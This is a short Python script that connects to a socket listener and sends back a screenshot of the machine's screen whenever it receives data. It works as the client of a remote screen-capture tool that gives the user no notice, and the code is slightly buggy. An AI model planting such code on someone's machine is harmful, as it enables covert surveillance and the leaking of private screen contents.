#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import base64
import os

from PIL import Image, ImageGrab
from io import BytesIO

sock = socket.socket()
byte_io = BytesIO()

sock.connect(('127.0.0.1', 9090))# 192.168.1.24

while True:
    data = sock.recv(99999999)
    if data:
        img = ImageGrab.grab()
        img.save(byte_io, 'png')

        sock.sendall(byte_io.getvalue())
        
        sock.close()
    if not data:
        break
